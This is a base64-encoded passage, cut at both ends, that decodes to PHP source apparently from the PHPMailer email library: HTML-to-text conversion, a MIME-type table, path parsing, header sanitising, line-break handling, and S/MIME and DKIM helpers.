XMtPmh0bWwydGV4dCgkbWVzc2FnZSwgJGFkdmFuY2VkKSk7CiAgICAgICAgaWYgKCEkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgewogICAgICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICdUaGlzIGlzIGFuIEhUTUwtb25seSBtZXNzYWdlLiBUbyB2aWV3IGl0LCBhY3RpdmF0ZSBIVE1MIGluIHlvdXIgZW1haWwgYXBwbGljYXRpb24uJwogICAgICAgICAgICAgICAgLiBzdGF0aWM6OiRMRTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICR0aGlzLT5Cb2R5OwogICAgfQogICAgLyoqCiAgICAgKiBDb252ZXJ0IGFuIEhUTUwgc3RyaW5nIGludG8gcGxhaW4gdGV4dC4KICAgICAqIFRoaXMgaXMgdXNlZCBieSBtc2dIVE1MKCkuCiAgICAgKiBOb3RlIC0gb2xkZXIgdmVyc2lvbnMgb2YgdGhpcyBmdW5jdGlvbiB1c2VkIGEgYnVuZGxlZCBhZHZhbmNlZCBjb252ZXJ0ZXIKICAgICAqIHdoaWNoIHdhcyByZW1vdmVkIGZvciBsaWNlbnNlIHJlYXNvbnMgaW4gIzIzMi4KICAgICAqIEV4YW1wbGUgdXNhZ2U6CiAgICAgKgogICAgICogYGBgcGhwCiAgICAgKiAvLyBVc2UgZGVmYXVsdCBjb252ZXJzaW9uCiAgICAgKiAkcGxhaW4gPSAkbWFpbC0+aHRtbDJ0ZXh0KCRodG1sKTsKICAgICAqIC8vIFVzZSB5b3VyIG93biBjdXN0b20gY29udmVydGVyCiAgICAgKiAkcGxhaW4gPSAkbWFpbC0+aHRtbDJ0ZXh0KCRodG1sLCBmdW5jdGlvbigkaHRtbCkgewogICAgICogICAgICRjb252ZXJ0ZXIgPSBuZXcgTXlIdG1sMnRleHQoJGh0bWwpOwogICAgICogICAgIHJldHVybiAkY29udmVydGVyLT5nZXRfdGV4dCgpOwogICAgICogfSk7CiAgICAgKiBgYGAKICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICAgICAgICAkaHRtbCAgICAgVGhlIEhUTUwgdGV4dCB0byBjb252ZXJ0CiAgICAgKiBAcGFyYW0gYm9vbHxjYWxsYWJsZSAkYWR2YW5jZWQgQW55IGJvb2xlYW4gdmFsdWUgdG8gdXNlIHRoZSBpbnRlcm5hbCBjb252ZXJ0ZXIsCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3IgcHJvdmlkZSB5b3VyIG93biBjYWxsYWJsZSBmb3IgY3VzdG9tIGNvbnZlcnNpb24KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaHRtbDJ0ZXh0KCRodG1sLCAkYWR2YW5jZWQgPSBmYWxzZSkKICAgIHsKICAgICAgICBpZiAoaXNfY2FsbGFibGUoJGFkdmFuY2VkKSkgewogICAgICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmMoJGFkdmFuY2VkLCAkaHRtbCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiBodG1sX2VudGl0eV9kZWNvZGUoCiAgICAgICAgICAgIHRyaW0oc3RyaXBfdGFncyhwcmVnX3JlcGxhY2UoJy88KGhlYWR8dGl0bGV8c3R5bGV8c2NyaXB0KVtePl0qPi4qPzxcL1xcMT4vc2knLCAnJywgJGh0bWwpKSksCiAgICAgICAgICAgIEVOVF9RVU9URVMsCiAgICAgICAgICAgICR0aGlzLT5DaGFyU2V0CiAgICAgICAgKTsKICAgIH0KICAgIC8qKgogICAgICogR2V0IHRoZSBNSU1FIHR5cGUgZm9yIGEgZmlsZSBleHRlbnNpb24uCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkZXh0IEZpbGUgZXh0ZW5zaW9uCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcgTUlNRSB0eXBlIG9mIGZpbGUKICAgICAqLwogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBfbWltZV90eXBlcygkZXh0ID0gJycpCiAgICB7CiAgICAgICAgJG1pbWVzID0gWwogICAgICAgICAgICAneGwnID0+ICdhcHBsaWNhdGlvbi9leGNlbCcsCiAgICAgICAgICAgICdqcycgPT4gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnLAogICAgICAgICAgICAnaHF4JyA9PiAnYXBwbGljYXRpb24vbWFjLWJpbmhleDQwJywKICAgICAgICAgICAgJ2NwdCcgPT4gJ2FwcGxpY2F0aW9uL21hYy1jb21wYWN0cHJvJywKICAgICAgICAgICAgJ2JpbicgPT4gJ2FwcGxpY2F0aW9uL21hY2JpbmFyeScsCiAgICAgICAgICAgICdkb2MnID0+ICdhcHBsaWNhdGlvbi9tc3dvcmQnLAogICAgICAgICAgICAnd29yZCcgPT4gJ2FwcGxpY2F0aW9uL21zd29yZCcsCiAgICAgICAgICAgICd4bHN4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnNwcmVhZHNoZWV0bWwuc2hlZXQnLAogICAgICAgICAgICAneGx0eCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5zcHJlYWRzaGVldG1sLnRlbXBsYXRlJywKICAgICAgICAgICAgJ3BvdHgnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwudGVtcGxhdGUnLAogICAgICAgICAgICAncHBzeCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5zbGlkZXNob3cnLAogICAgICAgICAgICAncHB0eCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5wcmVzZW50YXRpb24nLAogICAgICAgICAgICAnc2xkeCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5zbGlkZScsCiAgICAgICAgICAgICdkb2N4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LndvcmRwcm9jZXNzaW5nbWwuZG9jdW1lbnQnLAogICAgICAgICAgICAnZG90eCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC53b3JkcHJvY2Vzc2luZ21sLnRlbXBsYXRlJywKICAgICAgICAgICAgJ3hsYW0nID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwuYWRkaW4ubWFjcm9FbmFibGVkLjEyJywKICAgICAgICAgICAgJ3hsc2InID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwuc2hlZXQuYmluYXJ5Lm1hY3JvRW5hYmxlZC4xMicsCiAgICAgICAgICAgICdjbGFzcycgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdkbGwnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnZG1zJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKICAgICAgICAgICAgJ2V4ZScgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdsaGEnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnbHpoJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywKICAgICAgICAgICAgJ3BzZCcgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsCiAgICAgICAgICAgICdzZWEnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnc28nID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnb2RhJyA9PiAnYXBwbGljYXRpb24vb2RhJywKICAgICAgICAgICAgJ3BkZicgPT4gJ2FwcGxpY2F0aW9uL3BkZicsCiAgICAgICAgICAgICdhaScgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLAogICAgICAgICAgICAnZXBzJyA9PiAnYXBwbGljYXRpb24vcG9zdHNjcmlwdCcsCiAgICAgICAgICAgICdwcycgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLAogICAgICAgICAgICAnc21pJyA9PiAnYXBwbGljYXRpb24vc21pbCcsCiAgICAgICAgICAgICdzbWlsJyA9PiAnYXBwbGljYXRpb24vc21pbCcsCiAgICAgICAgICAgICdtaWYnID0+ICdhcHBsaWNhdGlvbi92bmQubWlmJywKICAgICAgICAgICAgJ3hscycgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbCcsCiAgICAgICAgICAgICdwcHQnID0+ICdhcHBsaWNhdGlvbi92bmQubXMtcG93ZXJwb2ludCcsCiAgICAgICAgICAgICd3YnhtbCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC53YXAud2J4bWwnLAogICAgICAgICAgICAnd21sYycgPT4gJ2FwcGxpY2F0aW9uL3ZuZC53YXAud21sYycsCiAgICAgICAgICAgICdkY3InID0+ICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywKICAgICAgICAgICAgJ2RpcicgPT4gJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLAogICAgICAgICAgICAnZHhyJyA9PiAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsCiAgICAgICAgICAgICdkdmknID0+ICdhcHBsaWNhdGlvbi94LWR2aScsCiAgICAgICAgICAgICdndGFyJyA9PiAnYXBwbGljYXRpb24veC1ndGFyJywKICAgICAgICAgICAgJ3BocDMnID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsCiAgICAgICAgICAgICdwaHA0JyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLAogICAgICAgICAgICAncGhwJyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLAogICAgICAgICAgICAncGh0bWwnID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsCiAgICAgICAgICAgICdwaHBzJyA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAtc291cmNlJywKICAgICAgICAgICAgJ3N3ZicgPT4gJ2FwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoJywKICAgICAgICAgICAgJ3NpdCcgPT4gJ2FwcGxpY2F0aW9uL3gtc3R1ZmZpdCcsCiAgICAgICAgICAgICd0YXInID0+ICdhcHBsaWNhdGlvbi94LXRhcicsCiAgICAgICAgICAgICd0Z3onID0+ICdhcHBsaWNhdGlvbi94LXRhcicsCiAgICAgICAgICAgICd4aHQnID0+ICdhcHBsaWNhdGlvbi94aHRtbCt4bWwnLAogICAgICAgICAgICAneGh0bWwnID0+ICdhcHBsaWNhdGlvbi94aHRtbCt4bWwnLAogICAgICAgICAgICAnemlwJyA9PiAnYXBwbGljYXRpb24vemlwJywKICAgICAgICAgICAgJ21pZCcgPT4gJ2F1ZGlvL21pZGknLAogICAgICAgICAgICAnbWlkaScgPT4gJ2F1ZGlvL21pZGknLAogICAgICAgICAgICAnbXAyJyA9PiAnYXVkaW8vbXBlZycsCiAgICAgICAgICAgICdtcDMnID0+ICdhdWRpby9tcGVnJywKICAgICAgICAgICAgJ200YScgPT4gJ2F1ZGlvL21wNCcsCiAgICAgICAgICAgICdtcGdhJyA9PiAnYXVkaW8vbXBlZycsCiAgICAgICAgICAgICdhaWYnID0+ICdhdWRpby94LWFpZmYnLAogICAgICAgICAgICAnYWlmYycgPT4gJ2F1ZGlvL3gtYWlmZicsCiAgICAgICAgICAgICdhaWZmJyA9PiAnYXVkaW8veC1haWZmJywKICAgICAgICAgICAgJ3JhbScgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJywKICAgICAgICAgICAgJ3JtJyA9PiAnYXVkaW8veC1wbi1yZWFsYXVkaW8nLAogICAgICAgICAgICAncnBtJyA9PiAnYXVkaW8veC1wbi1yZWFsYXVkaW8tcGx1Z2luJywKICAgICAgICAgICAgJ3JhJyA9PiAnYXVkaW8veC1yZWFsYXVkaW8nLAogICAgICAgICAgICAnd2F2JyA9PiAnYXVkaW8veC13YXYnLAogICAgICAgICAgICAnbWthJyA9PiAnYXVkaW8veC1tYXRyb3NrYScsCiAgICAgICAgICAgICdibXAnID0+ICdpbWFnZS9ibXAnLAogICAgICAgICAgICAnZ2lmJyA9PiAnaW1hZ2UvZ2lmJywKICAgICAgICAgICAgJ2pwZWcnID0+ICdpbWFnZS9qcGVnJywKICAgICAgICAgICAgJ2pwZScgPT4gJ2ltYWdlL2pwZWcnLAogICAgICAgICAgICAnanBnJyA9PiAnaW1hZ2UvanBlZycsCiAgICAgICAgICAgICdwbmcnID0+ICdpbWFnZS9wbmcnLAogICAgICAgICAgICAndGlmZicgPT4gJ2ltYWdlL3RpZmYnLAogICAgICAgICAgICAndGlmJyA9PiAnaW1hZ2UvdGlmZicsCiAgICAgICAgICAgICd3ZWJwJyA9PiAnaW1hZ2Uvd2VicCcsCiAgICAgICAgICAgICdoZWlmJyA9PiAnaW1hZ2UvaGVpZicsCiAgICAgICAgICAgICdoZWlmcycgPT4gJ2ltYWdlL2hlaWYtc2VxdWVuY2UnLAogICAgICAgICAgICAnaGVpYycgPT4gJ2ltYWdlL2hlaWMnLAogICAgICAgICAgICAnaGVpY3MnID0+ICdpbWFnZS9oZWljLXNlcXVlbmNlJywKICAgICAgICAgICAgJ2VtbCcgPT4gJ21lc3NhZ2UvcmZjODIyJywKICAgICAgICAgICAgJ2NzcycgPT4gJ3RleHQvY3NzJywKICAgICAgICAgICAgJ2h0bWwnID0+ICd0ZXh0L2h0bWwnLAogICAgICAgICAgICAnaHRtJyA9PiAndGV4dC9odG1sJywKICAgICAgICAgICAgJ3NodG1sJyA9PiAndGV4dC9odG1sJywKICAgICAgICAgICAgJ2xvZycgPT4gJ3RleHQvcGxhaW4nLAogICAgICAgICAgICAndGV4dCcgPT4gJ3RleHQvcGxhaW4nLAogICAgICAgICAgICAndHh0JyA9PiAndGV4dC9wbGFpbicsCiAgICAgICAgICAgICdydHgnID0+ICd0ZXh0L3JpY2h0ZXh0JywKICAgICAgICAgICAgJ3J0ZicgPT4gJ3RleHQvcnRmJywKICAgICAgICAgICAgJ3ZjZicgPT4gJ3RleHQvdmNhcmQnLAogICAgICAgICAgICAndmNhcmQnID0+ICd0ZXh0L3ZjYXJkJywKICAgICAgICAgICAgJ2ljcycgPT4gJ3RleHQvY2FsZW5kYXInLAogICAgICAgICAgICAneG1sJyA9PiAndGV4dC94bWwnLAogICAgICAgICAgICAneHNsJyA9PiAndGV4dC94bWwnLAogICAgICAgICAgICAnd212JyA9PiAndmlkZW8veC1tcy13bXYnLAogICAgICAgICAgICAnbXBlZycgPT4gJ3ZpZGVvL21wZWcnLAogICAgICAgICAgICAnbXBlJyA9PiAndmlkZW8vbXBlZycsCiAgICAgICAgICAgICdtcGcnID0+ICd2aWRlby9tcGVnJywKICAgICAgICAgICAgJ21wNCcgPT4gJ3ZpZGVvL21wNCcsCiAgICAgICAgICAgICdtNHYnID0+ICd2aWRlby9tcDQnLAogICAgICAgICAgICAnbW92JyA9PiAndmlkZW8vcXVpY2t0aW1lJywKICAgICAgICAgICAgJ3F0JyA9PiAndmlkZW8vcXVpY2t0aW1lJywKICAgICAgICAgICAgJ3J2JyA9PiAndmlkZW8vdm5kLnJuLXJlYWx2aWRlbycsCiAgICAgICAgICAgICdhdmknID0+ICd2aWRlby94LW1zdmlkZW8nLAogICAgICAgICAgICAnbW92aWUnID0+ICd2aWRlby94LXNnaS1tb3ZpZScsCiAgICAgICAgICAgICd3ZWJtJyA9PiAndmlkZW8vd2VibScsCiAgICAgICAgICAgICdta3YnID0+ICd2aWRlby94LW1hdHJvc2thJywKICAgICAgICBdOwogICAgICAgICRleHQgPSBzdHJ0b2xvd2VyKCRleHQpOwogICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKCRleHQsICRtaW1lcykpIHsKICAgICAgICAgICAgcmV0dXJuICRtaW1lc1skZXh0XTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nOwogICAgfQogICAgLyoqCiAgICAgKiBNYXAgYSBmaWxlIG5hbWUgdG8gYSBNSU1FIHR5cGUuCiAgICAgKiBEZWZhdWx0cyB0byAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywgaS5lLi4gYXJiaXRyYXJ5IGJpbmFyeSBkYXRhLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lIEEgZmlsZSBuYW1lIG9yIGZ1bGwgcGF0aCwgZG9lcyBub3QgbmVlZCB0byBleGlzdCBhcyBhIGZpbGUKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGZpbGVuYW1lVG9UeXBlKCRmaWxlbmFtZSkKICAgIHsKICAgICAgICAvLyBJbiBjYXNlIHRoZSBwYXRoIGlzIGEgVVJMLCBzdHJpcCBhbnkgcXVlcnkgc3RyaW5nIGJlZm9yZSBnZXR0aW5nIGV4dGVuc2lvbgogICAgICAgICRxcG9zID0gc3RycG9zKCRmaWxlbmFtZSwgJz8nKTsKICAgICAgICBpZiAoZmFsc2UgIT09ICRxcG9zKSB7CiAgICAgICAgICAgICRmaWxlbmFtZSA9IHN1YnN0cigkZmlsZW5hbWUsIDAsICRxcG9zKTsKICAgICAgICB9CiAgICAgICAgJGV4dCA9IHN0YXRpYzo6bWJfcGF0aGluZm8oJGZpbGVuYW1lLCBQQVRISU5GT19FWFRFTlNJT04pOwogICAgICAgIHJldHVybiBzdGF0aWM6Ol9taW1lX3R5cGVzKCRleHQpOwogICAgfQogICAgLyoqCiAgICAgKiBNdWx0aS1ieXRlLXNhZmUgcGF0aGluZm8gcmVwbGFjZW1lbnQuCiAgICAgKiBEcm9wLWluIHJlcGxhY2VtZW50IGZvciBwYXRoaW5mbygpLCBidXQgbXVsdGlieXRlLSBhbmQgY3Jvc3MtcGxhdGZvcm0tc2FmZS4KICAgICAqCiAgICAgKiBAc2VlICAgIGh0dHA6Ly93d3cucGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24ucGF0aGluZm8ucGhwIzEwNzQ2MQogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgICAgICRwYXRoICAgIEEgZmlsZW5hbWUgb3IgcGF0aCwgZG9lcyBub3QgbmVlZCB0byBleGlzdCBhcyBhIGZpbGUKICAgICAqIEBwYXJhbSBpbnR8c3RyaW5nICRvcHRpb25zIEVpdGhlciBhIFBBVEhJTkZPXyogY29uc3RhbnQsCiAgICAgKiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvciBhIHN0cmluZyBuYW1lIHRvIHJldHVybiBvbmx5IHRoZSBzcGVjaWZpZWQgcGllY2UKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZ3xhcnJheQogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIG1iX3BhdGhpbmZvKCRwYXRoLCAkb3B0aW9ucyA9IG51bGwpCiAgICB7CiAgICAgICAgJHJldCA9IFsnZGlybmFtZScgPT4gJycsICdiYXNlbmFtZScgPT4gJycsICdleHRlbnNpb24nID0+ICcnLCAnZmlsZW5hbWUnID0+ICcnXTsKICAgICAgICAkcGF0aGluZm8gPSBbXTsKICAgICAgICBpZiAocHJlZ19tYXRjaCgnI14oLio/KVtcXFxcL10qKChbXi9cXFxcXSo/KShcLihbXlwuXFxcXC9dKz8pfCkpW1xcXFwvXC5dKiQjaW0nLCAkcGF0aCwgJHBhdGhpbmZvKSkgewogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygxLCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgICAgICAkcmV0WydkaXJuYW1lJ10gPSAkcGF0aGluZm9bMV07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMiwgJHBhdGhpbmZvKSkgewogICAgICAgICAgICAgICAgJHJldFsnYmFzZW5hbWUnXSA9ICRwYXRoaW5mb1syXTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cyg1LCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgICAgICAkcmV0WydleHRlbnNpb24nXSA9ICRwYXRoaW5mb1s1XTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygzLCAkcGF0aGluZm8pKSB7CiAgICAgICAgICAgICAgICAkcmV0WydmaWxlbmFtZSddID0gJHBhdGhpbmZvWzNdOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJG9wdGlvbnMpIHsKICAgICAgICAgICAgY2FzZSBQQVRISU5GT19ESVJOQU1FOgogICAgICAgICAgICBjYXNlICdkaXJuYW1lJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydkaXJuYW1lJ107CiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fQkFTRU5BTUU6CiAgICAgICAgICAgIGNhc2UgJ2Jhc2VuYW1lJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydiYXNlbmFtZSddOwogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0VYVEVOU0lPTjoKICAgICAgICAgICAgY2FzZSAnZXh0ZW5zaW9uJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydleHRlbnNpb24nXTsKICAgICAgICAgICAgY2FzZSBQQVRISU5GT19GSUxFTkFNRToKICAgICAgICAgICAgY2FzZSAnZmlsZW5hbWUnOgogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2ZpbGVuYW1lJ107CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICByZXR1cm4gJHJldDsKICAgICAgICB9CiAgICB9CiAgICAvKioKICAgICAqIFNldCBvciByZXNldCBpbnN0YW5jZSBwcm9wZXJ0aWVzLgogICAgICogWW91IHNob3VsZCBhdm9pZCB0aGlzIGZ1bmN0aW9uIC0gaXQncyBtb3JlIHZlcmJvc2UsIGxlc3MgZWZmaWNpZW50LCBtb3JlIGVycm9yLXByb25lIGFuZAogICAgICogaGFyZGVyIHRvIGRlYnVnIHRoYW4gc2V0dGluZyBwcm9wZXJ0aWVzIGRpcmVjdGx5LgogICAgICogVXNhZ2UgRXhhbXBsZToKICAgICAqIGAkbWFpbC0+c2V0KCdTTVRQU2VjdXJlJywgJ3RscycpO2AKICAgICAqICAgaXMgdGhlIHNhbWUgYXM6CiAgICAgKiBgJG1haWwtPlNNVFBTZWN1cmUgPSAndGxzJztgLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgIFRoZSBwcm9wZXJ0eSBuYW1lIHRvIHNldAogICAgICogQHBhcmFtIG1peGVkICAkdmFsdWUgVGhlIHZhbHVlIHRvIHNldCB0aGUgcHJvcGVydHkgdG8KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldCgkbmFtZSwgJHZhbHVlID0gJycpCiAgICB7CiAgICAgICAgaWYgKHByb3BlcnR5X2V4aXN0cygkdGhpcywgJG5hbWUpKSB7CiAgICAgICAgICAgICR0aGlzLT4kbmFtZSA9ICR2YWx1ZTsKICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygndmFyaWFibGVfc2V0JykgLiAkbmFtZSk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgLyoqCiAgICAgKiBTdHJpcCBuZXdsaW5lcyB0byBwcmV2ZW50IGhlYWRlciBpbmplY3Rpb24uCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNlY3VyZUhlYWRlcigkc3RyKQogICAgewogICAgICAgIHJldHVybiB0cmltKHN0cl9yZXBsYWNlKFsiXHIiLCAiXG4iXSwgJycsICRzdHIpKTsKICAgIH0KICAgIC8qKgogICAgICogTm9ybWFsaXplIGxpbmUgYnJlYWtzIGluIGEgc3RyaW5nLgogICAgICogQ29udmVydHMgVU5JWCBMRiwgTWFjIENSIGFuZCBXaW5kb3dzIENSTEYgbGluZSBicmVha3MgaW50byBhIHNpbmdsZSBsaW5lIGJyZWFrIGZvcm1hdC4KICAgICAqIERlZmF1bHRzIHRvIENSTEYgKGZvciBtZXNzYWdlIGJvZGllcykgYW5kIHByZXNlcnZlcyBjb25zZWN1dGl2ZSBicmVha3MuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkdGV4dAogICAgICogQHBhcmFtIHN0cmluZyAkYnJlYWt0eXBlIFdoYXQga2luZCBvZiBsaW5lIGJyZWFrIHRvIHVzZTsgZGVmYXVsdHMgdG8gc3RhdGljOjokTEUKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIG5vcm1hbGl6ZUJyZWFrcygkdGV4dCwgJGJyZWFrdHlwZSA9IG51bGwpCiAgICB7CiAgICAgICAgaWYgKG51bGwgPT09ICRicmVha3R5cGUpIHsKICAgICAgICAgICAgJGJyZWFrdHlwZSA9IHN0YXRpYzo6JExFOwogICAgICAgIH0KICAgICAgICAvLyBOb3JtYWxpc2UgdG8gXG4KICAgICAgICAkdGV4dCA9IHN0cl9yZXBsYWNlKFsiXHJcbiIsICJcciJdLCAiXG4iLCAkdGV4dCk7CiAgICAgICAgLy8gTm93IGNvbnZlcnQgTEUgYXMgbmVlZGVkCiAgICAgICAgaWYgKCJcbiIgIT09ICRicmVha3R5cGUpIHsKICAgICAgICAgICAgJHRleHQgPSBzdHJfcmVwbGFjZSgiXG4iLCAkYnJlYWt0eXBlLCAkdGV4dCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkdGV4dDsKICAgIH0KICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBjdXJyZW50IGxpbmUgYnJlYWsgZm9ybWF0IHN0cmluZy4KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGdldExFKCkKICAgIHsKICAgICAgICByZXR1cm4gc3RhdGljOjokTEU7CiAgICB9CiAgICAvKioKICAgICAqIFNldCB0aGUgbGluZSBicmVhayBmb3JtYXQgc3RyaW5nLCBlLmcuICJcclxuIi4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRsZQogICAgICovCiAgICBwcm90ZWN0ZWQgc3RhdGljIGZ1bmN0aW9uIHNldExFKCRsZSkKICAgIHsKICAgICAgICBzdGF0aWM6OiRMRSA9ICRsZTsKICAgIH0KICAgIC8qKgogICAgICogU2V0IHRoZSBwdWJsaWMgYW5kIHByaXZhdGUga2V5IGZpbGVzIGFuZCBwYXNzd29yZCBmb3IgUy9NSU1FIHNpZ25pbmcuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkY2VydF9maWxlbmFtZQogICAgICogQHBhcmFtIHN0cmluZyAka2V5X2ZpbGVuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nICRrZXlfcGFzcyAgICAgICAgICAgIFBhc3N3b3JkIGZvciBwcml2YXRlIGtleQogICAgICogQHBhcmFtIHN0cmluZyAkZXh0cmFjZXJ0c19maWxlbmFtZSBPcHRpb25hbCBwYXRoIHRvIGNoYWluIGNlcnRpZmljYXRlCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzaWduKCRjZXJ0X2ZpbGVuYW1lLCAka2V5X2ZpbGVuYW1lLCAka2V5X3Bhc3MsICRleHRyYWNlcnRzX2ZpbGVuYW1lID0gJycpCiAgICB7CiAgICAgICAgJHRoaXMtPnNpZ25fY2VydF9maWxlID0gJGNlcnRfZmlsZW5hbWU7CiAgICAgICAgJHRoaXMtPnNpZ25fa2V5X2ZpbGUgPSAka2V5X2ZpbGVuYW1lOwogICAgICAgICR0aGlzLT5zaWduX2tleV9wYXNzID0gJGtleV9wYXNzOwogICAgICAgICR0aGlzLT5zaWduX2V4dHJhY2VydHNfZmlsZSA9ICRleHRyYWNlcnRzX2ZpbGVuYW1lOwogICAgfQogICAgLyoqCiAgICAgKiBRdW90ZWQtUHJpbnRhYmxlLWVuY29kZSBhIERLSU0gaGVhZGVyLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHR4dAogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX1FQKCR0eHQpCiAgICB7CiAgICAgICAgJGxpbmUgPSAnJzsKICAgICAgICAkbGVuID0gc3RybGVuKCR0eHQpOwogICAgICAgIGZvciAoJGkgPSAwOyAkaSA8ICRsZW47ICsrJGkpIHsKICAgICAgICAgICAgJG9yZCA9IG9yZCgkdHh0WyRpXSk7Ci